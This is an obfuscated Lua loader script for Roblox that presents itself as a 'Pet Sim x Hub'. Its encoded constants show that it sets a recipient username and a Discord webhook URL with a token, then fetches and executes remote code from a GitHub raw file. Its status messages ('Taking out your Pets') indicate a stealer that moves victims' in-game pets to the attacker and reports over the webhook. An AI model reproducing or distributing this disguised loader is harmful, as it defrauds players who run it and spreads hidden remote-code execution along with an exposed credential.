do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v20)if (v1(v20,2)==79) then local v73=0;while true do if (v73==0) then v19=v0(v3(v20,1,1));return "";end end else local v74=0;local v75;while true do if (v74==0) then v75=v2(v0(v20,16));if v19 then local v98=0;local v99;while true do if (v98==1) then return v99;end if (v98==0) then v99=v5(v75,v19);v19=nil;v98=1;end end else return v75;end break;end end end end);local function v21(v22,v23,v24)if v24 then local v76=(v22/((7 -5)^(v23-(1 + 0))))%((2 + 0)^(((v24-(1500 -(226 + 1273))) -(v23-(1 + 0))) + 1));return v76-(v76%(2 -1));else local v77=2^(v23-(1 + 0));return (((v22%(v77 + v77))>=v77) and 1) or (407 -((1221 -(967 + 138)) + 80 + 211));end end local function v25()local v38=v1(v16,v18,v18);v18=v18 + 1;return v38;end local function v26()local v39=524 -((1160 -(472 + 271)) + 107);local v40;local v41;while true do if (v39==(2 -1)) then return (v41 * (2020 -((442 -(52 + 219)) + 1593))) + v40;end if (v39==(0 -0)) then v40,v41=v1(v16,v18,v18 + 1 + 1);v18=v18 + 2 + 0;v39=2 -1;end end end local function v27()local v42=0 -0;local v43;local v44;local v45;local v46;while true do if (v42==(0 + 0)) then v43,v44,v45,v46=v1(v16,v18,v18 + (9 -6) + 0);v18=v18 + 4;v42=2 -1;end if (v42==1) then return (v46 * (16778537 -(664 + 657))) + (v45 * 65536) + (v44 * ((1316 -858) -(136 + 66))) + v43;end end end local function v28()local v47=v27();local v48=v27();local v49=1 + 0;local v50=(v21(v48,1,713 -(56 + 637)) * ((1312 -(50 + 1260))^(426 -(19 + 375)))) + v47;local v51=v21(v48,19 + 2,777 -(113 + 633));local v52=((v21(v48,287 -(225 + 30))==(1432 -(790 + 616 + 25))) and  -(922 -(301 + 620))) or (1335 -((1379 -(274 + 350)) + 579));if (v51==((1984 -1158) -(217 + 609))) then if (v50==0) then return v52 * 0;else v51=1 + 0;v49=0 + 0;end elseif (v51==(3740 -(654 + 191 + 848))) then return ((v50==(0 + 0)) and (v52 * ((1 + 0)/0))) or (v52 * NaN);end return v8(v52,v51-((5028 -(33 + 62)) -(664 + 3246))) * (v49 + (v50/((5 -3)^(10 + 42))));end local function v29(v30)local v53;if  not v30 then v30=v27();if (v30==(0 + 0)) then return "";end end v53=v3(v16,v18,(v18 + v30) -(1 + 0));v18=v18 + v30;local v54={};for v66=65 -(42 + 22), #v53 do v54[v66]=v2(v1(v3(v53,v66,v66)));end return v6(v54);end local v31=v27;local function v32(...)return {...},v12("#",...);end local function v33()local v55=101 -(76 + 25);local v56;local v57;local v58;local v59;local v60;local v61;local v62;while true do if (v55~=(1606 -(1138 + 465))) then else v62=nil;while true do local v92=0;local v93;while true do if (0~=v92) then else v93=0 -0;while true do if (v93==1) then if (v56~=(441 -(389 + 52))) then else v57={};v58={};v59={};v60={v57,v58,nil,v59};v56=1;end break;end if (v93~=(0 -0)) then else local v102=0;while true do if ((0 -0)~=v102) then else if (v56==(50 -(30 + 19))) then local v103=0;while true do if (v103==(1901 -(219 + 1681))) then for v135=692 -(454 + 237),v61 do local v136=0 -0;local v137;local v138;local v139;while true do if (v136==0) then v137=0;v138=nil;v136=1;end if (v136~=(1 -0)) then else v139=nil;while true do if (v137==(0 + 0)) then local v151=0;while true do if (v151==(292 -(24 + 268))) then v138=v25();v139=nil;v151=316 -(119 + 196);end if (v151~=(833 -(261 + 571))) then else v137=1;break;end end end if (v137~=(1310 -(1052 + 257))) then else if (v138==1) then v139=v25()~=(0 + 0);elseif (v138==(1 + 1)) then v139=v28();elseif (v138==(5 -2)) then v139=v29();end v62[v135]=v139;break;end end break;end end end v60[3]=v25();v103=3 -1;end if (v103==2) then v56=1921 -(718 + 1201);break;end if (v103~=0) then else v61=v27();v62={};v103=1 -0;end end end if ((1 + 1)==v56) then local v104=0 -0;local v105;while true do if (v104~=(0 + 0)) then else v105=1592 -(564 + 1028);while true do local v140=0;while true do if (v140==(1882 -(748 + 1134))) then if (0~=v105) then else for v153=567 -(400 + 166),v27() do local v154=0;local v155;local v156;local v157;while true do if (1~=v154) then else v157=nil;while true do if (v155~=(0 -0)) then else local v174=0 + 0;while true do if (v174~=(1865 -(647 + 1217))) then else v155=1;break;end if (v174==(0 + 0)) then v156=0 + 0;v157=nil;v174=221 -(186 + 34);end end end if (v155~=(1 -0)) then else while true do if (v156==(0 -0)) then v157=v25();if (v21(v157,1,2 -1)==0) then local v177=368 -(237 + 131);local v178;local v179;local v180;local v181;while true do if (v177==2) then while true do if (v178==0) then local v185=0 + 0;local v186;local v187;while true do if (v185~=1) then else while true do if (v186~=0) then else v187=0 + 0;while true do if (v187==0) then local v200=0 + 0;local v201;while true do if (v200==0) then v201=0;while true do if (v201==0) then local v206=0;while true do if (v206~=0) then else v179=v21(v157,6 -4,3);v180=v21(v157,4,6);v206=1;end if (v206==1) then v201=1;break;end end end if (1==v201) then v187=1;break;end end break;end end end if (v187==1) then v178=1191 -(649 + 541);break;end end break;end end break;end if (v185==(159 -(126 + 33))) then v186=1987 -(1008 + 979);v187=nil;v185=1;end end end if (v178~=(374 -(322 + 49))) then else if (v21(v180,7 -4,5 -2)==(1 -0)) then v181[4]=v62[v181[1457 -(255 + 1198)]];end v57[v153]=v181;break;end if (v178==(1 + 0)) then local v189=539 -(208 + 331);local v190;while true do if (v189==(0 + 0)) then v190=0;while true do if (v190~=0) then else local v195=0 -0;while true do if (v195==(0 -0)) then v181={v26(),v26(),nil,nil};if (v179==(0 -0)) then local v202=0;while true do if (v202==(80 -(19 + 61))) then v181[114 -(93 + 18)]=v26();v181[4]=v26();break;end end elseif (v179==(1 + 0)) then v181[3]=v27();elseif (v179==2) then v181[6 -3]=v27() -((1544 -(174 + 1368))^16);elseif (v179==3) then local v208=824 -(253 + 571);local v209;local v210;while true do if (v208==(1803 -(1496 + 306))) then while true do if (v209~=(23 -(13 + 10))) then else v210=0 + 0;while true do if (v210==0) then v181[2 + 1]=v27() -(2^16);v181[17 -13]=v26();break;end end break;end end break;end if (v208==0) then v209=0 + 0;v210=nil;v208=1;end end end v195=1;end if (v195==1) then v190=1 + 0;break;end end end if (v190==(1 + 0)) then v178=2;break;end end break;end end end if (v178~=2) then else local v191=0;local v192;while true do if (v191~=0) then else v192=0 -0;while true do if (v192==(0 + 0)) then if (v21(v180,1,1)~=(1 + 0)) then else v181[4 -2]=v62[v181[1678 -(129 + 1547)]];end if (v21(v180,2,1 + 1)==1) then v181[3]=v62[v181[3 + 0]];end v192=249 -(34 + 214);end if (v192==(763 -(266 + 496))) then v178=3;break;end end break;end end end end break;end if (1==v177) then local v182=0;local v183;while true do if (v182==(0 -0)) then v183=0;while true do if (v183==(0 -0)) then v180=nil;v181=nil;v183=344 -(148 + 195);end if (v183==1) then v177=2 + 0;break;end end break;end end end if (v177==(0 -0)) then local v184=0 -0;while true do if (v184==(0 -0)) then v178=0 -0;v179=nil;v184=1;end if (1==v184) then v177=1468 -(1047 + 420);break;end end end end end break;end end break;end end break;end if (v154==(0 + 0)) then v155=558 -(454 + 104);v156=nil;v154=1;end end end for v158=1 -0,v27() do v58[v158-1]=v33();end v105=832 -(342 + 489);end if (v105==(1 + 0)) then local v146=1277 -(731 + 546);while true do if (v146==(0 -0)) then for v168=1 + 0,v27() do v59[v168]=v27();end return v60;end end end break;end end end break;end end end v102=1;end if (1==v102) then v93=2 -1;break;end end end end break;end end end break;end if (v55==(1 + 0)) then v58=nil;v59=nil;v55=2;end if (v55==2) then v60=nil;v61=nil;v55=3;end if (0~=v55) then else v56=0 -0;v57=nil;v55=1752 -(793 + 958);end end end local function v34(v35,v36,v37)local v63=v35[1];local v64=v35[2];local v65=v35[3];return function(...)local v68=1;local v69= -1;local v70={...};local v71=v12("#",...) -1;local function v72()local v78=v63;local v79=v64;local v80=v65;local v81=v32;local v82={};local v83={};local v84={};for v88=657 -(96 + 561),v71 do if (((82 + 1725)<=(5264 -2070)) and (v88>=v80)) then v82[v88-v80]=v70[v88 + (3 -2)];else v84[v88]=v70[v88 + 1];end end local v85=(v71-v80) + (1863 -(1663 + 199));local v86;local v87;while true do local v89=0 + 0;local v90;while true do if ((v89==(1589 -(194 + 1395))) or ((6479 -4804)<(1912 -(175 + 1576)))) then v90=1414 -(807 + 607);while true do if (((2 -1)==v90) or ((3051 -(397 + (1978 -(761 + 923))))>=((11065 -4778) -3896))) then if ((v87<=(1929 -(1211 + 713))) or (2188>(357 + 3911))) then if ((v87<=(2 + 0)) or ((2018 + 245)<=(1758 -478))) then if ((v87<=0) or ((4805 -(7 + 730))<=(5369 -(644 + 662)))) then v84[v86[1081 -(905 + 174)]]=v37[v86[1 + 2]];elseif ((v87==(4 -3)) or ((1059 + 240)>(1001 + 2319))) then v68=v86[5 -2];elseif (((8508 -5766)<=(1851 + 1993)) and (v86[2 -0]==v84[v86[1549 -(1143 + (1103 -701))]])) then v68=v68 + 1 + 0;else v68=v86[3 + 0];end elseif (((1239 -612)==(1204 -(449 + 128))) and (v87<=3)) then local v108=0;local v109;local v110;local v111;local v112;local v113;local v114;while true do if ((v108==(0 -0)) or ((2529 + 2253)<3403)) then v109=(1365 -490) -((300 -187) + 762);v110=nil;v108=1308 -(595 + 712);end if ((v108==(1515 -(1270 + 70 + 172))) or (1806>(9876 -7796))) then while true do if (((331 + 1323)<(1787 + 49)) and (v109==(2 + 0 + 0))) then v114=nil;while true do if (((5610 -(698 + 520))>=(2485 -(1003 + 533))) and (v110==(4 -2))) then for v160=v111,v69 do local v161=309 -(131 + 178);local v162;local v163;while true do if (((1870 -(332 + 910))<(3622 -(230 + 9))) and (v161==(0 -0))) then v162=65 -(64 + 1);v163=nil;v161=3 -2;end if (((1 + (677 -(490 + 187)))==v161) or (2184<=(2550 -(724 + 126)))) then while true do if (((1176 -(474 + 702))==v162) or ((1630 + 1381)>=4219)) then v163=(0 -0) + 0;while true do if (((2252 -(1577 + 149))<(4364 + 10)) and (v163==((1927 -(351 + 1576)) + 0))) then v114=v114 + 1 + 0;v84[v160]=v112[v114];break;end end break;end end break;end end end break;end if ((((4084 + 2154) -(506 + 1411))==(5796 -(757 + 718))) and (v110==((2560 -(273 + 1448)) -(432 + 368 + 39)))) then local v147=1858 -(446 + 1412);local v148;while true do if ((v147==0) or ((176 + 1891)<=(346 + 1238))) then v148=0 -0;while true do if (((1859 + 1730)>3404) and (v148==(2 -1))) then v110=3 -2;break;end if (((438 + 67)<(6141 -(832 + 372))) and ((0 + 0)==v148)) then v111=v86[(70 + 303) -(141 + 230)];v112,v113=v81(v84[v111](v13(v84,v111 + 1 + 0,v86[1332 -(5 + 1324)])));v148=1;end end break;end end end if ((v110==(173 -(131 + (1030 -(417 + 572))))) or (1470==(10285 -5865))) then local v149=(245 + 428) -(518 + 155);local v150;while true do if (((4803 -(1378 + 159))<(6593 -((63 -46) + 1733))) and (((923 -(143 + 780)) -0)==v149)) then v150=0;while true do if ((v150==0) or ((775 + 4165)<(4777 -3051))) then local v173=0 -0;while true do if ((v173==((501 + 632) -(195 + 937))) or ((6484 -(1095 + 856))==4608)) then v150=1245 -(554 + 690);break;end if ((v173==(0 -(1176 -(313 + 863)))) or ((122 + 419)>(177 + 898))) then v69=(v113 + v111) -((1 + 0) -0);v114=1198 -(260 + 938);v173=1 -(1088 -(1035 + 53));end end end if ((1558<(5463 -(471 + 1168))) and (1==v150)) then v110=1509 -(288 + 121 + 1098);break;end end break;end end end end break;end if (((107 -68)==39) and (v109==(0 -0))) then v110=1466 -(1062 + 404);v111=nil;v109=1 -0;end if (((3632 + 893)==((5426 -(825 + 45)) -(25 + 6))) and (v109==1)) then v112=nil;v113=nil;v109=1 + 1;end end break;end if (((2 + 0)==v108) or (3151==((53190 -40724) -(5146 + 4056)))) then v113=nil;v114=nil;v108=(1325 -(376 + 946)) -0;end if ((v108==(2 -1)) or (2699>(13959 -9510))) then v111=nil;v112=nil;v108=2;end end elseif ((v87==4) or ((7478 -4775)>=(4630 -(759 + 211)))) then local v121=0 + 0;local v122;local v123;local v124;local v125;while true do if ((v121==0) or ((7949 -3662)<(634 -314))) then v122=0;v123=nil;v121=3 -2;end if (((8436 -5570)<(2991 + 1343)) and (((2340 -(453 + 184)) -(812 + 890))==v121)) then v124=nil;v125=nil;v121=1 + 1;end if ((((5122 -3345) -696)==(1477 -(29 + 367))) and ((791 -(691 + 98))==v121)) then while true do if ((v122==(1 + 0)) or (((1242 -(38 + 20)) + 1541)>(433 + 4482))) then v125=nil;while true do if (((4772 -(220 + 1473))>(2489 -(49 + 69 + 941))) and (v123==((1784 -(175 + 337)) -(1226 + 46)))) then local v164=0;while true do if ((1613<4683) and (v164==1)) then v123=1 + 0;break;end if (((1991 -(1298 + 693))==v164) or ((3409 -(642 + 737))>=(3482 + 1262))) then v124=v86[4 -2];v125=v84[v86[3]];v164=2 -1;end end end if (((1000 + 452)<(4728 -(323 + 738))) and (v123==(1336 -(952 + 383)))) then v84[v124 + 1]=v125;v84[v124]=v125[v86[604 -((324 -150) + 426)]];break;end end break;end if ((v122==(0 + 0)) or ((2290 -(318 + 374))<=(95 + 227))) then local v145=0;while true do if (((60 + 12)<=(3788 -1221)) and (v145==(40 -(19 + 21)))) then v123=0;v124=nil;v145=(1 -0) -0;end if ((((5123 -(11 + 495)) -(68 + 40))>=(521 + 342)) and (v145==(1 + 0))) then v122=1861 -(134 + 223 + 1503);break;end end end end break;end end else do return;end end elseif ((v87<=((33 -10) -(1099 -(425 + 659)))) or ((627 -419)>=(192 + 1193))) then if (((5321 -(1375 + (954 -(376 + 512))))==(10327 -6447)) and (v87<=(5 + 1))) then local v115=0 -0;local v116;local v117;while true do if ((v115==1) or (3086>=(8988 -4045))) then while true do if ((((1091 + 1596) -1602)==(2954 -1869)) and (v116==(0 + 0))) then v117=v86[2 + 0];v84[v117]=v84[v117](v13(v84,v117 + 1,v69));break;end end break;end if ((((791 -420) + 2145)==(246 + 2270)) and ((1045 -(247 + 798))==v115)) then v116=0;v117=nil;v115=1;end end elseif ((v87==(18 -11)) or ((3 + 176)>(544 + 2352))) then v84[v86[2 + 0]]();elseif ((2150>=(3154 -1176)) and (v84[v86[6 -4]]==v86[4])) then v68=v68 + 1 + (660 -(75 + 585));else v68=v86[3];end elseif ((v87<=(1250 -(408 + 832))) or ((3766 -1312)<=(85 + 509))) then if ((v87==(1895 -(536 + 1350))) or ((6724 -3946)>=(1055 + 1294 + 1175))) then v84[v86[9 -7]]=v86[3 + 0];else v37[v86[1484 -(1151 + 330)]]=v84[v86[2]];end elseif ((v87==(8 + 3)) or ((495 -300)>=(1631 -(47 + 377)))) then v84[v86[2 + 0]][v86[3]]=v86[515 -((209 -126) + 428)];else for v133=v86[2 + 0],v86[2 + 1] do v84[v133]=nil;end end v68=v68 + 1 + 0;break;end if (((1790 -(1389 + 174))==((11 -7) + 223)) and (v90==(0 + 0))) then local v100=1895 -(1108 + 787);local v101;while true do if ((((23437 -18043) -3003)==2391) and (v100==(494 -(33 + (981 -520))))) then v101=0;while true do if (((4844 -((2245 -1406) + (1504 -750)))>=(488 + 2644)) and (v101==(1 + 0 + 0))) then v90=1 + 0;break;end if ((((314 + 65) -((894 -(55 + 745)) + 285))==v101) or ((153 + 4216)==(4256 -(52 + 26 + 172)))) then v86=v78[v68];v87=v86[537 -(285 + 251)];v101=2 -1;end end break;end end end end break;end end end end A,B=v32(v11(v72));if  not A[1] then local v91=v35[4][v68] or "?";error("Script error at ["   .. v91   .. "]:"   .. A[2]);else return v13(A,2,B);end end;end return v34(v33(),{},v17)(...);end v15("LOL!173O00028O00026O00F03F03023O005F4703103O00437573746F6D5363726970744E616D65030D3O005065742053696D20782048756203053O00546578743103103O00536372697074204C6F616465643O2E027O0040026O00084003053O00546578743203143O0054616B696E67206F757420796F7572205065747303053O005465787433030F3O00462O6564696E6720506574733O2E03083O00557365726E616D65030E3O006765736C6570656E706F6564657203073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313036393733303334333832373033343135322F47536E512D44675533505536725935793765504F63594F69336266446443676A736943696235796B303776426E38593248566B6E415232494E735441457838422D4A4E6903053O005465787434030F3O005374617274696E67204755493O2E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403453O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D2F6D61696E2F792O65742E6C756100423O0012093O00014O000C000100013O0026083O0002000100010004013O00020001001209000100013O00260800010014000100020004013O00140001001209000200013O000E020001000F000100020004013O000F000100122O000300033O00300B00030004000500122O000300033O00300B000300060007001209000200023O00260800020008000100020004013O00080001001209000100083O0004013O001400010004013O0008000100260800010023000100080004013O00230001001209000200013O0026080002001B000100020004013O001B0001001209000100093O0004013O0023000100260800020017000100010004013O0017000100122O000300033O00300B0003000A000B00122O000300033O00300B0003000C000D001209000200023O0004013O0017000100260800010032000100010004013O00320001001209000200013O0026080002002D000100010004013O002D00010012090003000F3O00120A0003000E3O001209000300113O00120A000300103O001209000200023O000E0200020026000100020004013O00260001001209000100023O0004013O003200010004013O0026000100260800010005000100090004013O0005000100122O000200033O00300B00020012001300122O000200143O00122O000300153O002004000300030016001209000500174O0003000300054O000600023O00022O00070002000100010004013O004100010004013O000500010004013O004100010004013O000200012O00053O00017O00423O00023O00033O00053O00053O00063O00083O00083O00093O000B3O000B3O000C3O000C3O000D3O000D3O000E3O00103O00103O00113O00123O00133O00163O00163O00173O00193O00193O001A3O001B3O001D3O001D3O001E3O001E3O001F3O001F3O00203O00213O00243O00243O00253O00273O00273O00283O00283O00293O00293O002A3O002C3O002C3O002D3O002E3O002F3O00323O00323O00333O00333O00343O00343O00343O00343O00343O00343O00343O00353O00363O00383O00393O003B3O00",v9(),...);end
